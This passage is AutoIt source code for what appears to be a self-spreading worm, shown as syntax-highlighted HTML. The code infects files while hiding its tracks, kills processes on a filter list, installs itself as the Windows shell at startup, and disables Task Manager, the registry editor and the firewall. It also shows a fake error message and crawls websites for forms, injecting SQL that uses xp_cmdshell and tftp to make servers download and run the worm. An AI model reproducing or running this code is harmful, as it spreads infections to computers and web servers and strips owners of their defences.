        </span><span class="sc9">$ret</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$handle</span><span class="sc0"> </span><span class="sc8">&lt;&gt;</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0">
        </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$ret</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
            </span><span class="sc9">$host_body</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"[h0st]"</span><span class="sc8">&amp;</span><span class="sc9">$host_body</span><span class="sc0">
            </span><span class="sc4">FileWrite</span><span class="sc8">(</span><span class="sc9">$handle</span><span class="sc8">,</span><span class="sc9">$my_body</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$host_body</span><span class="sc8">)</span><span class="sc0">
            </span><span class="sc4">FileClose</span><span class="sc8">(</span><span class="sc9">$handle</span><span class="sc8">)</span><span class="sc0">
        </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc4">FileSetTime</span><span class="sc8">(</span><span class="sc9">$host</span><span class="sc8">,</span><span class="sc9">$time_modified</span><span class="sc8">,</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc4">FileSetTime</span><span class="sc8">(</span><span class="sc9">$host</span><span class="sc8">,</span><span class="sc9">$time_accessed</span><span class="sc8">,</span><span class="sc3">2</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc4">FileSetAttrib</span><span class="sc8">(</span><span class="sc9">$host</span><span class="sc8">,</span><span class="sc9">$host_attributes</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">Return</span><span class="sc0"> </span><span class="sc9">$ret</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> EndBadProcs</span><span class="sc8">()</span><span class="sc1">;if any process name matches one of the filters, ends it</span><span class="sc0">
    </span><span class="sc9">$procs</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> ProcessList</span><span class="sc8">()</span><span class="sc0">
    </span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$i</span><span class="sc8">=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">To</span><span class="sc0"> </span><span class="sc4">UBound</span><span class="sc8">(</span><span class="sc9">$procs</span><span class="sc8">)-</span><span class="sc3">1</span><span class="sc0">
        </span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$j</span><span class="sc8">=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">To</span><span class="sc0"> </span><span class="sc4">UBound</span><span class="sc8">(</span><span class="sc9">$bad_procs</span><span class="sc8">)-</span><span class="sc3">1</span><span class="sc0">
            </span><span class="sc5">If</span><span class="sc8">(</span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$procs</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">][</span><span class="sc3">0</span><span class="sc8">],</span><span class="sc9">$bad_procs</span><span class="sc8">[</span><span class="sc9">$j</span><span class="sc8">],</span><span class="sc0">false</span><span class="sc8">))</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                </span><span class="sc4">ProcessClose</span><span class="sc8">(</span><span class="sc9">$procs</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">][</span><span class="sc3">1</span><span class="sc8">])</span><span class="sc0">
            </span><span class="sc5">EndIf</span><span class="sc0">
        </span><span class="sc5">Next</span><span class="sc0">
    </span><span class="sc5">Next</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> SetStartup</span><span class="sc8">()</span><span class="sc1">;sets the startup</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringLen</span><span class="sc8">(</span><span class="sc9">$reg_key</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">&gt;</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;using the registry (under winnt)</span><span class="sc0">
        </span><span class="sc4">RegWrite</span><span class="sc8">(</span><span class="sc9">$reg_key</span><span class="sc8">,</span><span class="sc7">"Shell"</span><span class="sc8">,</span><span class="sc7">"REG_SZ"</span><span class="sc8">,</span><span class="sc9">$reg_val</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">Else</span><span class="sc1">;using the system.ini method (under win98/me)</span><span class="sc0">
        </span><span class="sc4">IniWrite</span><span class="sc8">(</span><span class="sc6">@WindowsDir</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"\System.ini"</span><span class="sc8">,</span><span class="sc7">"boot"</span><span class="sc8">,</span><span class="sc7">"shell"</span><span class="sc8">,</span><span class="sc9">$reg_val</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">EndIf</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> FixReg</span><span class="sc8">()</span><span class="sc1">;fixes the regstry</span><span class="sc0">
 </span><span class="sc4">Regwrite</span><span class="sc8">(</span><span class="sc7">"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"</span><span class="sc8">,</span><span class="sc7">"ShowSuperHidden"</span><span class="sc8">,</span><span class="sc7">"REG_DWORD"</span><span class="sc8">,</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc1">;to not show hidden system files</span><span class="sc0">
 </span><span class="sc4">RegWrite</span><span class="sc8">(</span><span class="sc7">"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"</span><span class="sc8">,</span><span class="sc7">"DisableRegistryTools"</span><span class="sc8">,</span><span class="sc7">"REG_DWORD"</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc1">;to disable the registry editor</span><span class="sc0">
 </span><span class="sc4">RegWrite</span><span class="sc8">(</span><span class="sc7">"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"</span><span class="sc8">,</span><span class="sc7">"DisableTaskMgr"</span><span class="sc8">,</span><span class="sc7">"REG_DWORD"</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc1">;to disable the task mgr</span><span class="sc0">
 </span><span class="sc4">RegWrite</span><span class="sc8">(</span><span class="sc7">"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"</span><span class="sc8">,</span><span class="sc7">"NoFolderOptions"</span><span class="sc8">,</span><span class="sc7">"REG_DWORD"</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc1">;to not show "folder options.." under xplorer.exe's menus</span><span class="sc0">
 </span><span class="sc4">RegWrite</span><span class="sc8">(</span><span class="sc7">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess"</span><span class="sc8">,</span><span class="sc7">"Start"</span><span class="sc8">,</span><span class="sc7">"REG_DWORD"</span><span class="sc8">,</span><span class="sc3">4</span><span class="sc8">)</span><span class="sc1">;to disable the windows firewall at startup</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> Quit</span><span class="sc8">(</span><span class="sc9">$bShow</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc9">$bShow</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc4">MsgBox</span><span class="sc8">(</span><span class="sc3">16</span><span class="sc8">,</span><span class="sc7">"Error"</span><span class="sc8">,</span><span class="sc0">@AutoItExe</span><span class="sc8">&amp;</span><span class="sc7">" is not a valid Win32 application."</span><span class="sc8">,</span><span class="sc3">20</span><span class="sc8">)</span><span class="sc1">;fake msg</span><span class="sc0">
    </span><span class="sc5">Exit</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> Hax</span><span class="sc8">(</span><span class="sc9">$sBServer</span><span class="sc8">,</span><span class="sc9">$sSPage</span><span class="sc8">)</span><span class="sc1">;tries to hax a given web server by finding any injectable url or form and trying to inject commands to make the server download and execute remotely our worm</span><span class="sc0">
    </span><span class="sc9">$tftp_name</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Int</span><span class="sc8">(</span><span class="sc4">Random</span><span class="sc8">(</span><span class="sc3">1000</span><span class="sc8">,</span><span class="sc3">2000</span><span class="sc8">))</span><span class="sc0">
    </span><span class="sc9">$sSQLInjectionQuery</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"waitfor delay '0:0:3'; exec master..xp_cmdshell 'tftp.exe -i "</span><span class="sc8">&amp;</span><span class="sc6">@IPAddress1</span><span class="sc8">&amp;</span><span class="sc7">" GET worm "</span><span class="sc8">&amp;</span><span class="sc9">$tftp_name</span><span class="sc8">&amp;</span><span class="sc7">".exe'; waitfor delay '0:0:5'; exec master..xp_cmdshell '"</span><span class="sc8">&amp;</span><span class="sc9">$tftp_name</span><span class="sc8">&amp;</span><span class="sc7">".exe';"</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sBServer</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc8">(</span><span class="sc4">Stringinstr</span><span class="sc8">(</span><span class="sc9">$sBServer</span><span class="sc8">,</span><span class="sc7">"://"</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$sBServer</span><span class="sc8">=</span><span class="sc7">"http://"</span><span class="sc8">&amp;</span><span class="sc9">$sBServer</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc8">(</span><span class="sc4">Stringright</span><span class="sc8">(</span><span class="sc9">$sBServer</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)&lt;&gt;</span><span class="sc7">"/"</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc4">stringright</span><span class="sc8">(</span><span class="sc9">$sBServer</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)&lt;&gt;</span><span class="sc7">"\"</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$sBServer</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sBServer</span><span class="sc8">&amp;</span><span class="sc7">"/"</span><span class="sc0">
    </span><span class="sc9">$sBServer</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> FormatURL</span><span class="sc8">(</span><span class="sc9">$sBServer</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$sSPage</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> FormatURL</span><span class="sc8">(</span><span class="sc9">$sSPage</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sSPage</span><span class="sc8">,</span><span class="sc7">"://"</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$sSPage</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sBServer</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$sSPage</span><span class="sc0">
    StartSearch</span><span class="sc8">(</span><span class="sc9">$sBServer</span><span class="sc8">,</span><span class="sc9">$sSPage</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> StartSearch</span><span class="sc8">(</span><span class="sc9">$sRootServer</span><span class="sc8">,</span><span class="sc9">$sStartAddress</span><span class="sc8">)</span><span class="sc1">;searches the given address for juicy urls and forms to hack</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sRootServer</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc8">(</span><span class="sc4">Stringinstr</span><span class="sc8">(</span><span class="sc9">$sRootServer</span><span class="sc8">,</span><span class="sc7">"://"</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$sRootServer</span><span class="sc8">=</span><span class="sc7">"http://"</span><span class="sc8">&amp;</span><span class="sc9">$sRootServer</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc8">(</span><span class="sc4">Stringright</span><span class="sc8">(</span><span class="sc9">$sRootServer</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)&lt;&gt;</span><span class="sc7">"/"</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc4">stringright</span><span class="sc8">(</span><span class="sc9">$sRootServer</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)&lt;&gt;</span><span class="sc7">"\"</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$sRootServer</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sRootServer</span><span class="sc8">&amp;</span><span class="sc7">"/"</span><span class="sc0">
    </span><span class="sc9">$sRootServer</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> FormatURL</span><span class="sc8">(</span><span class="sc9">$sRootServer</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$sStartAddress</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> FormatURL</span><span class="sc8">(</span><span class="sc9">$sStartAddress</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sStartAddress</span><span class="sc8">,</span><span class="sc7">"://"</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$sStartAddress</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sRootServer</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$sStartAddress</span><span class="sc0">
    </span><span class="sc9">$StartPageCode</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> HTTPRequest</span><span class="sc8">(</span><span class="sc9">$sStartAddress</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$StartPageCode</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">&gt;</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
        </span><span class="sc5">If</span><span class="sc0"> Analyze</span><span class="sc8">(</span><span class="sc9">$StartPageCode</span><span class="sc8">,</span><span class="sc4">stringleft</span><span class="sc8">(</span><span class="sc9">$sStartAddress</span><span class="sc8">,</span><span class="sc0">LastIndexOf</span><span class="sc8">(</span><span class="sc9">$sStartAddress</span><span class="sc8">,</span><span class="sc7">"/"</span><span class="sc8">,</span><span class="sc0">false</span><span class="sc8">)+</span><span class="sc3">1</span><span class="sc8">),</span><span class="sc0">GetResourceName</span><span class="sc8">(</span><span class="sc9">$sStartAddress</span><span class="sc8">))</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
            </span><span class="sc5">Return</span><span class="sc0">
        </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$sSessionLinks</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$sOldLinks</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0">
        </span><span class="sc5">EndIf</span><span class="sc0">
        </span><span class="sc9">$SQLVec</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringsplit</span><span class="sc8">(</span><span class="sc9">$sOldLinks</span><span class="sc8">,</span><span class="sc6">@lf</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">Else</span><span class="sc0">
        </span><span class="sc9">$SQLVec</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringsplit</span><span class="sc8">(</span><span class="sc9">$sSessionLinks</span><span class="sc8">,</span><span class="sc6">@lf</span><span class="sc8">)</span><span class="sc0">
        </span><span class="sc9">$sOldLinks</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sOldLinks</span><span class="sc8">&amp;</span><span class="sc6">@lf</span><span class="sc8">&amp;</span><span class="sc9">$sSessionLinks</span><span class="sc0">
        </span><span class="sc9">$sSessionLinks</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
    </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc9">$l</span><span class="sc8">=</span><span class="sc3">1</span><span class="sc0">
    </span><span class="sc9">$i</span><span class="sc8">=</span><span class="sc4">int</span><span class="sc8">(</span><span class="sc4">random</span><span class="sc8">(</span><span class="sc3">0</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)*(</span><span class="sc9">$SQLVec</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]-</span><span class="sc3">1</span><span class="sc8">))+</span><span class="sc3">1</span><span class="sc0">
    </span><span class="sc5">While</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$l</span><span class="sc8">&lt;=</span><span class="sc9">$SQLVec</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc5">And</span><span class="sc0"> </span><span class="sc8">((</span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$SQLVec</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">])=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sXpLinks</span><span class="sc8">,</span><span class="sc9">$SQLVec</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">])&gt;</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$SQLVec</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">],</span><span class="sc7">"forum"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc4">Random</span><span class="sc8">(</span><span class="sc3">0</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)&lt;</span><span class="sc3">0.9</span><span class="sc8">))</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0">
        </span><span class="sc9">$i</span><span class="sc8">=</span><span class="sc4">int</span><span class="sc8">(</span><span class="sc4">random</span><span class="sc8">(</span><span class="sc3">0</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)*(</span><span class="sc9">$SQLVec</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]-</span><span class="sc3">1</span><span class="sc8">))+</span><span class="sc3">1</span><span class="sc0">
        </span><span class="sc9">$l</span><span class="sc8">+=</span><span class="sc3">1</span><span class="sc0">
    </span><span class="sc5">WEnd</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc9">$l</span><span class="sc8">&lt;=</span><span class="sc9">$SQLVec</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
        </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$xl</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringsplit</span><span class="sc8">(</span><span class="sc9">$sXpLinks</span><span class="sc8">,</span><span class="sc6">@lf</span><span class="sc8">)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$xl</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]&lt;=</span><span class="sc3">25</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
            </span><span class="sc9">$sXpLinks</span><span class="sc0"> </span><span class="sc8">&amp;=</span><span class="sc0"> </span><span class="sc9">$SQLVec</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@lf</span><span class="sc0">
            StartSearch</span><span class="sc8">(</span><span class="sc9">$sRootServer</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc9">$SQLVec</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">])</span><span class="sc0">
        </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc5">EndIf</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> Analyze</span><span class="sc8">(</span><span class="sc9">$sCode</span><span class="sc8">,</span><span class="sc9">$sRoot</span><span class="sc8">,</span><span class="sc9">$sResName</span><span class="sc8">)</span><span class="sc1">;analyzes the code searching urls and forms</span><span class="sc0">
    </span><span class="sc9">$sCode</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> FormatText</span><span class="sc8">(</span><span class="sc9">$sCode</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$CodeLines</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringSplit</span><span class="sc8">(</span><span class="sc9">$sCode</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc6">@lf</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$new_url</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$bWritingUrl</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> false
    </span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$ln</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$codelines</span><span class="sc8">[</span><span class="sc9">$ln</span><span class="sc8">])&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc4">stringlower</span><span class="sc8">(</span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc9">$ln</span><span class="sc8">]),</span><span class="sc7">"&lt;form"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc5">not</span><span class="sc0"> </span><span class="sc9">$bWritingUrl</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
                </span><span class="sc9">$bWritingUrl</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> true
                </span><span class="sc9">$new_url</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> GetOption</span><span class="sc8">(</span><span class="sc7">"action"</span><span class="sc8">,</span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc9">$ln</span><span class="sc8">])</span><span class="sc0">
                </span><span class="sc9">$new_url_method</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringUpper</span><span class="sc8">(</span><span class="sc0">GetOption</span><span class="sc8">(</span><span class="sc7">"method"</span><span class="sc8">,</span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc9">$ln</span><span class="sc8">]))</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$new_url_method</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc9">$new_url_method</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"GET"</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$new_url</span><span class="sc8">,</span><span class="sc7">"?"</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$new_url</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$new_url</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"?"</span><span class="sc0">
            </span><span class="sc5">endif</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc9">$ln</span><span class="sc8">]),</span><span class="sc7">"&lt;input"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc9">$ln</span><span class="sc8">]),</span><span class="sc7">"&lt;select"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc9">$bWritingUrl</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
                </span><span class="sc9">$varname</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> GetOption</span><span class="sc8">(</span><span class="sc7">"name"</span><span class="sc8">,</span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc9">$ln</span><span class="sc8">])</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$varname</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">stringright</span><span class="sc8">(</span><span class="sc9">$new_url</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">"?"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$new_url</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$new_url</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"&amp;"</span><span class="sc0">
                    </span><span class="sc9">$new_url</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$new_url</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$varname</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"="</span><span class="sc0">
                    </span><span class="sc9">$param_value</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> GetOption</span><span class="sc8">(</span><span class="sc7">"value"</span><span class="sc8">,</span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc9">$ln</span><span class="sc8">])</span><span class="sc0">
